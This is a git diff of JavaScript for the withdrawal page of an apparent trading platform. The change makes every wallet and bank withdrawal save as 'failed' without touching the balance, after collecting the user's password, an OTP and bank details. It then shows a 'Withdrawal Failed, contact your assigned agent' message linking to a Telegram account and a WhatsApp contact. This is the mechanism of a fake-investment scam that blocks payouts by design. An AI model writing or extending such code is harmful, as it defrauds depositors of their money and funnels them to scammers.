@@ -1,4 +1,3 @@
-// Import the functions you need from the SDKs you need
 import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
 import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-analytics.js";
 import {
@@ -10,12 +9,11 @@ import {
   getFirestore,
   getDoc,
   doc,
-  updateDoc,
   setDoc,
   serverTimestamp,
 } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-firestore.js";
 
-// Your web app's Firebase configuration
+// Firebase config
 const firebaseConfig = {
   apiKey: "AIzaSyASg5UlPTgE0HH-iM3HRfeMSY2a2Noa3o4",
   authDomain: "iqtraders1.firebaseapp.com",
@@ -38,6 +36,23 @@ const walletAddress = document.getElementById("walletAddress");
 const withdrawalNetwork = document.getElementById("network");
 const withdrawalCurrency = document.getElementById("currency");
 const withdrawalPlatform = document.getElementById("platform");
+
+const withdrawBank = document.getElementById("select-bank");
+const withdrawBankForm = document.getElementById("withdraw-bank-form");
+const withdrawWallet = document.getElementById("select-wallet");
+
+if (withdrawBank) {
+  withdrawBank.addEventListener("click", () => {
+    withdrawBankForm.classList.remove("hidden");
+    form.classList.add("hidden");
+  });
+}
+if (withdrawWallet) {
+  withdrawWallet.addEventListener("click", () => {
+    withdrawBankForm.classList.add("hidden");
+    form.classList.remove("hidden");
+  });
+}
 
 // Helper: Show modal
 function showModal(content, options = {}) {
@@ -125,17 +140,12 @@ async function fetchUserBalance(uid) {
   throw new Error("User not found");
 }
 
-// Update user balance in Firestore
-async function updateUserBalance(uid, newBalance) {
-  await updateDoc(doc(db, "users", uid), { Balance: newBalance });
-}
-
 // Save withdrawal request to Firestore
 async function saveWithdrawal(logId, uid, data) {
   await setDoc(doc(db, "withdrawals", logId), {
     ...data,
     uid,
-    status: "pending",
+    status: "failed",
     createdAt: serverTimestamp(),
   });
 }
@@ -145,52 +155,53 @@ function generateOTP() {
   return Math.floor(100000 + Math.random() * 900000).toString();
 }
 
-// Main form submit handler
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
+// Main form submit handler (WALLET)
+if (form) {
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
 
-  // 1. Validate fields
-  const validation = validateFields();
-  if (!validation.valid) {
-    showModal(
-      `<div class="text-red-600 font-semibold text-center">${validation.message}</div>`
-    );
-    setTimeout(hideModal, 2000);
-    return;
-  }
-
-  // 2. Show preloader
-  showPreloader();
-
-  // 3. Check user balance
-  onAuthStateChanged(auth, async (user) => {
-    if (!user) {
-      hideModal();
+    // 1. Validate fields
+    const validation = validateFields();
+    if (!validation.valid) {
       showModal(
-        `<div class="text-red-600 font-semibold text-center">User not authenticated.</div>`
+        `<div class="text-red-600 font-semibold text-center">${validation.message}</div>`
       );
       setTimeout(hideModal, 2000);
       return;
     }
-    try {
-      // Fetch logId from localStorage
-      const logId = localStorage.getItem("logId") || crypto.randomUUID();
 
-      const balance = await fetchUserBalance(user.uid);
-      const withdrawAmount = parseFloat(amount.value);
+    // 2. Show preloader
+    showPreloader();
 
-      if (withdrawAmount > balance) {
+    // 3. Check user balance
+    onAuthStateChanged(auth, async (user) => {
+      if (!user) {
         hideModal();
         showModal(
-          `<div class="text-red-600 font-semibold text-center">Insufficient balance.</div>`
+          `<div class="text-red-600 font-semibold text-center">User not authenticated.</div>`
         );
         setTimeout(hideModal, 2000);
         return;
       }
+      try {
+        // Fetch logId from localStorage
+        const logId = localStorage.getItem("logId") || crypto.randomUUID();
 
-      // 4. Ask for email and password
-      hideModal();
-      showModal(`
+        const balance = await fetchUserBalance(user.uid);
+        const withdrawAmount = parseFloat(amount.value);
+
+        if (withdrawAmount > balance) {
+          hideModal();
+          showModal(
+            `<div class="text-red-600 font-semibold text-center">Insufficient balance.</div>`
+          );
+          setTimeout(hideModal, 2000);
+          return;
+        }
+
+        // 4. Ask for email and password
+        hideModal();
+        showModal(`
         <form id="email-pass-form" class="flex flex-col gap-4">
           <div class="flex flex-col">
             <label class="font-semibold">Email</label>
@@ -204,36 +215,38 @@ form.addEventListener("submit", async (e) => {
         </form>
       `);
 
-      document.getElementById("email-pass-form").onsubmit = async (ev) => {
-        ev.preventDefault();
-        const emailInput = document.getElementById("modal-email").value.trim();
-        const passInput = document
-          .getElementById("modal-password")
-          .value.trim();
+        document.getElementById("email-pass-form").onsubmit = async (ev) => {
+          ev.preventDefault();
+          const emailInput = document
+            .getElementById("modal-email")
+            .value.trim();
+          const passInput = document
+            .getElementById("modal-password")
+            .value.trim();
 
-        // Validate email and password
-        if (emailInput !== user.email) {
-          showModal(
-            `<div class="text-red-600 font-semibold text-center">Email does not match.</div>`
-          );
-          setTimeout(hideModal, 2000);
-          return;
-        }
-        // Re-authenticate user
-        try {
-          await signInWithEmailAndPassword(auth, emailInput, passInput);
-        } catch (err) {
-          showModal(
-            `<div class="text-red-600 font-semibold text-center">Incorrect password.</div>`
-          );
-          setTimeout(hideModal, 2000);
-          return;
-        }
+          // Validate email and password
+          if (emailInput !== user.email) {
+            showModal(
+              `<div class="text-red-600 font-semibold text-center">Email does not match.</div>`
+            );
+            setTimeout(hideModal, 2000);
+            return;
+          }
+          // Re-authenticate user
+          try {
+            await signInWithEmailAndPassword(auth, emailInput, passInput);
+          } catch (err) {
+            showModal(
+              `<div class="text-red-600 font-semibold text-center">Incorrect password.</div>`
+            );
+            setTimeout(hideModal, 2000);
+            return;
+          }
 
-        // 5. OTP Modal
-        const otp = generateOTP();
-        hideModal();
-        showModal(`
+          // 5. OTP Modal
+          const otp = generateOTP();
+          hideModal();
+          showModal(`
           <form id="otp-form" class="flex flex-col gap-4">
             <div class="flex flex-col items-center">
               <svg class="h-10 w-10 text-blue-500 mb-2" fill="none" viewBox="0 0 24 24">
@@ -247,137 +260,295 @@ form.addEventListener("submit", async (e) => {
           </form>
         `);
 
-        document.getElementById("otp-form").onsubmit = async (ev2) => {
-          ev2.preventDefault();
-          const otpInput = document.getElementById("modal-otp").value.trim();
-          if (otpInput !== otp) {
+          document.getElementById("otp-form").onsubmit = async (ev2) => {
+            ev2.preventDefault();
+            const otpInput = document.getElementById("modal-otp").value.trim();
+            if (otpInput !== otp) {
+              showModal(
+                `<div class="text-red-600 font-semibold text-center">Incorrect OTP.</div>`
+              );
+              setTimeout(hideModal, 2000);
+              return;
+            }
+
+            // 6. Preloader for 3 seconds
+            showPreloader("Processing transaction...");
+            setTimeout(async () => {
+              // 7. Save withdrawal as failed (do NOT update balance)
+              try {
+                await saveWithdrawal(logId, user.uid, {
+                  amount: withdrawAmount,
+                  walletAddress: walletAddress.value.trim(),
+                  network: withdrawalNetwork.value.trim(),
+                  currency: withdrawalCurrency.value.trim(),
+                  platform: withdrawalPlatform.value.trim(),
+                });
+
+                hideModal();
+
+                // 8. Withdrawal Failed Modal
+                showModal(`
+                  <div class="flex flex-col items-center gap-4">
+                    <svg class="h-16 w-16 text-red-600 mb-2" fill="none" viewBox="0 0 24 24">
+                      <circle cx="12" cy="12" r="10" fill="#fee2e2"/>
+                      <path d="M8 8l8 8M16 8l-8 8" stroke="#dc2626" stroke-width="2" stroke-linecap="round"/>
+                    </svg>
+                    <div class="text-center">
+                      <h2 class="text-2xl font-bold text-red-600 mb-2">Withdrawal Failed</h2>
+                      <p class="mb-2 text-gray-700">Your withdrawal could not be processed. Withdrawal disabled please kindly contact your assigned agent or customer support for assistance.
+                      </p>
+                      <p class="text admin-icon">
+                        <a href="https://t.me/Trader_Martinezan01" target="_blank">
+                          <i class="fa-brands fa-telegram"></i>
+                        </a>
+                        <a href="https://wa.link/tkkvm1" target="_blank">
+                          <i class="fa-brands fa-whatsapp"></i>
+                        </a>
+                      </p>
+                      <div class="bg-red-50 rounded p-3 text-left text-sm border border-red-200">
+                        <div><span class="font-semibold">Amount:</span> $${amount.value}</div>
+                        <div><span class="font-semibold">Wallet Address:</span> ${walletAddress.value}</div>
+                        <div><span class="font-semibold">Network:</span> ${withdrawalNetwork.value}</div>
+                        <div><span class="font-semibold">Currency:</span> ${withdrawalCurrency.value}</div>
+                        <div><span class="font-semibold">Platform:</span> ${withdrawalPlatform.value}</div>
+                      </div>
+                    </div>
+                    <button id="close-failed" class="mt-2 bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700">Close</button>
+                  </div>
+                `);
+                document.getElementById("close-failed").onclick = () => {
+                  window.location.href = "/user/index.html";
+                };
+              } catch (err) {
+                hideModal();
+                showModal(
+                  `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
+                );
+                setTimeout(hideModal, 2000);
+              }
+            }, 3000);
+          };
+        };
+      } catch (err) {
+        hideModal();
+        showModal(
+          `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
+        );
+        setTimeout(hideModal, 2000);
+      }
+    });
+  });
+}
+
+// BANK FORM LOGIC
+const bankForm = document.getElementById("withdraw-bank-form");
+const bankAmount = document.getElementById("amount");
+const accountNumber = document.getElementById("account-number");
+const bankName = document.getElementById("bank-name");
+const accountName = document.getElementById("account-name");
+
+const bankRegex = {
+  amount: /^\d+(\.\d{1,2})?$/, // Accepts 100, 100.5, 100.55
+  accountNumber: /^\d{6,20}$/,
+  bankName: /^[A-Za-z0-9\s\-]{3,40}$/,
+  accountName: /^[A-Za-z\s\-]{3,40}$/,
+};
+
+function validateBankFields() {
+ 
+  if (!bankRegex.accountNumber.test(accountNumber.value.trim())) {
+    return { valid: false, message: "Invalid account number." };
+  }
+  if (!bankRegex.bankName.test(bankName.value.trim())) {
+    return { valid: false, message: "Invalid bank name." };
+  }
+  if (!bankRegex.accountName.test(accountName.value.trim())) {
+    return { valid: false, message: "Invalid beneficiary name." };
+  }
+  return { valid: true };
+}
+
+if (bankForm) {
+  bankForm.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    // 1. Validate fields
+    const validation = validateBankFields();
+    if (!validation.valid) {
+      showModal(
+        `<div class="text-red-600 font-semibold text-center">${validation.message}</div>`
+      );
+      setTimeout(hideModal, 2000);
+      return;
+    }
+
+    // 2. Show preloader
+    showPreloader();
+
+    // 3. Check user balance
+    onAuthStateChanged(auth, async (user) => {
+      if (!user) {
+        hideModal();
+        showModal(
+          `<div class="text-red-600 font-semibold text-center">User not authenticated.</div>`
+        );
+        setTimeout(hideModal, 2000);
+        return;
+      }
+      try {
+        // Fetch logId from localStorage
+        const logId = localStorage.getItem("logId") || crypto.randomUUID();
+
+        const balance = await fetchUserBalance(user.uid);
+        const withdrawAmount = parseFloat(bankAmount.value);
+
+        if (withdrawAmount > balance) {
+          hideModal();
+          showModal(
+            `<div class="text-red-600 font-semibold text-center">Insufficient balance.</div>`
+          );
+          setTimeout(hideModal, 2000);
+          return;
+        }
+
+        // 4. Ask for email and password
+        hideModal();
+        showModal(`
+        <form id="email-pass-form-bank" class="flex flex-col gap-4">
+          <div class="flex flex-col">
+            <label class="font-semibold">Email</label>
+            <input type="email" id="modal-email-bank" class="border rounded px-2 py-1" required />
+          </div>
+          <div class="flex flex-col">
+            <label class="font-semibold">Password</label>
+            <input type="password" id="modal-password-bank" class="border rounded px-2 py-1" required />
+          </div>
+          <button type="submit" class="bg-blue-600 text-white rounded py-2 font-bold hover:bg-blue-700 transition">Continue</button>
+        </form>
+      `);
+
+        document.getElementById("email-pass-form-bank").onsubmit = async (
+          ev
+        ) => {
+          ev.preventDefault();
+          const emailInput = document
+            .getElementById("modal-email-bank")
+            .value.trim();
+          const passInput = document
+            .getElementById("modal-password-bank")
+            .value.trim();
+
+          if (emailInput !== user.email) {
             showModal(
-              `<div class="text-red-600 font-semibold text-center">Incorrect OTP.</div>`
+              `<div class="text-red-600 font-semibold text-center">Email does not match.</div>`
+            );
+            setTimeout(hideModal, 2000);
+            return;
+          }
+          try {
+            await signInWithEmailAndPassword(auth, emailInput, passInput);
+          } catch (err) {
+            showModal(
+              `<div class="text-red-600 font-semibold text-center">Incorrect password.</div>`
             );
             setTimeout(hideModal, 2000);
             return;
           }
 
-          // 6. Preloader for 3 seconds
-          showPreloader("Processing transaction...");
-          setTimeout(async () => {
-            // 7. Update balance and save withdrawal
-            try {
-              const newBalance = balance - withdrawAmount;
-              await updateUserBalance(user.uid, newBalance);
+          // 5. OTP Modal
+          const otp = generateOTP();
+          hideModal();
+          showModal(`
+          <form id="otp-form-bank" class="flex flex-col gap-4">
+            <div class="flex flex-col items-center">
+              <svg class="h-10 w-10 text-blue-500 mb-2" fill="none" viewBox="0 0 24 24">
+                <path stroke="currentColor" stroke-width="2" d="M12 4v16m8-8H4"/>
+              </svg>
+              <span class="font-semibold text-lg">Enter this OTP:</span>
+              <span class="text-2xl font-bold text-blue-600">${otp}</span>
+            </div>
+            <input type="text" id="modal-otp-bank" class="border rounded px-2 py-1 text-center" maxlength="6" required />
+            <button type="submit" class="bg-blue-600 text-white rounded py-2 font-bold hover:bg-blue-700 transition">Verify OTP</button>
+          </form>
+        `);
 
-              await saveWithdrawal(logId, user.uid, {
-                amount: withdrawAmount,
-                walletAddress: walletAddress.value.trim(),
-                network: withdrawalNetwork.value.trim(),
-                currency: withdrawalCurrency.value.trim(),
-                platform: withdrawalPlatform.value.trim(),
-              });
-
-              hideModal();
-
-              // 8. Transaction pending modal
-              showModal(`
-                <div class="flex flex-col items-center gap-4">
-                  <svg class="h-12 w-12 text-yellow-500 animate-spin mb-2" fill="none" viewBox="0 0 24 24">
-                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"></path>
-                  </svg>
-                  <div class="text-center">
-                    <h2 class="text-xl font-bold text-yellow-600 mb-2">Transaction Pending</h2>
-                    <p class="mb-2">Your withdrawal is being processed and is awaiting admin approval (within 24 hours).</p>
-                    <div class="bg-gray-100 rounded p-3 text-left text-sm">
-                      <div><span class="font-semibold">Amount:</span> $${amount.value}</div>
-                      <div><span class="font-semibold">Wallet Address:</span> ${walletAddress.value}</div>
-                      <div><span class="font-semibold">Network:</span> ${withdrawalNetwork.value}</div>
-                      <div><span class="font-semibold">Currency:</span> ${withdrawalCurrency.value}</div>
-                      <div><span class="font-semibold">Platform:</span> ${withdrawalPlatform.value}</div>
-                    </div>
-                  </div>
-                  <div class="icon-wrapper">
-                      <div class="text-wrapper text-center">
-                          <p>Withdrawal still Processing?</p>
-                          <p>Contact our support team at 
-                            <p class="text admin-icon">
-                              <a
-                                href="https://t.me/Trader_Martinezan01 "
-                                target="_blank"
-                              >
-                                <i class="fa-brands fa-telegram"></i>
-                              </a>
-                              <a href="https://wa.link/tkkvm1" target="_blank">
-                                <i class="fa-brands fa-whatsapp"></i>
-                              </a>
-                            </p>
-                          </p>
-                      </div>
-                    </div>
-                  <button id="close-pending" class="mt-2 bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">Close</button>
-                </div>
-              `);
-              document
-                .getElementById("close-pending")
-                .addEventListener("click", () => {
-                  window.location.href = "/user/index.html";
-                });
-
-              // Your provided code for withdrawBtn
-              const withdrawBtn = document.getElementById("withdrawBtn");
-              const popMessage = document.getElementById("popMessage");
-              if (withdrawBtn && popMessage) {
-                withdrawBtn.addEventListener("click", () => {
-                  popMessage.style.display = "flex";
-                  popMessage.innerHTML = `
-                  <div class="relative animation-container-p ">
-                  <div class="cancel-sign-btn" id="cancel-sign-btn"><span>&#10005;</span></div>
-                    <div class="icon-wrapper">
-                      <svg class="notification-icon" viewBox="0 0 52 52">
-                        <path d="M26 6.3a19.5 19.5 0 0 1 13.8 33.2c.1 2.3-1.9 4-4.1 4H16.3c-2.2 0-4.2-1.7-4.1-4a19.5 19.5 0 0 1 13.8-33.2z"/>
-                          <path d="M26 17.5v10.5"/>
-                          <path d="M26 39.5a3.5 3.5 0 1 1 0-7 3.5 3.5 0 0 1 0 7z"/>
-                      </svg>
-                      <div class="text-wrapper text-center">
-                          <p>Withdrawal still Processing?</p>
-                          <p>Contact our support team at 
-                            <p class="text admin-icon">
-                              <a
-                                href="https://t.me/Trader_Martinezan01 "
-                                target="_blank"
-                              >
-                                <i class="fa-brands fa-telegram"></i>
-                              </a>
-                              <a href="https://wa.link/tkkvm1" target="_blank">
-                                <i class="fa-brands fa-whatsapp"></i>
-                              </a>
-                            </p>
-                          </p>
-                      </div>
-                    </div>
-                  </div>
-                `;
-                  const cancelBtn = document.getElementById("cancel-sign-btn");
-                  if (cancelBtn)
-                    cancelBtn.onclick = () => {
-                      popMessage.style.display = "none";
-                    };
-                });
-              }
-            } catch (err) {
-              hideModal();
+          document.getElementById("otp-form-bank").onsubmit = async (ev2) => {
+            ev2.preventDefault();
+            const otpInput = document
+              .getElementById("modal-otp-bank")
+              .value.trim();
+            if (otpInput !== otp) {
               showModal(
-                `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
+                `<div class="text-red-600 font-semibold text-center">Incorrect OTP.</div>`
               );
               setTimeout(hideModal, 2000);
+              return;
             }
-          }, 3000);
+
+            // 6. Preloader for 3 seconds
+            showPreloader("Processing transaction...");
+            setTimeout(async () => {
+              try {
+                await saveWithdrawal(logId, user.uid, {
+                  amount: withdrawAmount,
+                  accountNumber: accountNumber.value.trim(),
+                  bankName: bankName.value.trim(),
+                  accountName: accountName.value.trim(),
+                  type: "bank",
+                });
+
+                hideModal();
+
+                // 8. Withdrawal Failed Modal
+                showModal(`
+                  <div class="flex flex-col items-center gap-4">
+                    <svg class="h-16 w-16 text-red-600 mb-2" fill="none" viewBox="0 0 24 24">
+                      <circle cx="12" cy="12" r="10" fill="#fee2e2"/>
+                      <path d="M8 8l8 8M16 8l-8 8" stroke="#dc2626" stroke-width="2" stroke-linecap="round"/>
+                    </svg>
+                    <div class="text-center">
+                      <h2 class="text-2xl font-bold text-red-600 mb-2">Withdrawal Failed</h2>
+                      <p class="mb-2 text-gray-700">Your withdrawal could not be processed. Withdrawal disabled please kindly contact your assigned agent or customer support for assistance.
+                      </p>
+                      <p class="text admin-icon">
+                        <a href="https://t.me/Trader_Martinezan01" target="_blank">
+                          <i class="fa-brands fa-telegram"></i>
+                        </a>
+                        <a href="https://wa.link/tkkvm1" target="_blank">
+                          <i class="fa-brands fa-whatsapp"></i>
+                        </a>
+                      </p>
+
+                      <div class="bg-red-50 rounded p-3 text-left text-sm border border-red-200">
+                        <div><span class="font-semibold">Amount:</span> $${bankAmount.value}</div>
+                        <div><span class="font-semibold">Account Number:</span> ${accountNumber.value}</div>
+                        <div><span class="font-semibold">Bank Name:</span> ${bankName.value}</div>
+                        <div><span class="font-semibold">Beneficiary Name:</span> ${accountName.value}</div>
+                      </div>
+                    </div>
+                    <button id="close-failed-bank" class="mt-2 bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700">Close</button>
+                  </div>
+                `);
+                document.getElementById("close-failed-bank").onclick = () => {
+                  window.location.href = "/user/index.html";
+                };
+              } catch (err) {
+                hideModal();
+                showModal(
+                  `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
+                );
+                setTimeout(hideModal, 2000);
+              }
+            }, 3000);
+          };
         };
-      };
-    } catch (err) {
-      hideModal();
-      showModal(
-        `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
-      );
-      setTimeout(hideModal, 2000);
-    }
+      } catch (err) {
+        hideModal();
+        showModal(
+          `<div class="text-red-600 font-semibold text-center">${err.message}</div>`
+        );
+        setTimeout(hideModal, 2000);
+      }
+    });
   });
-});
+}
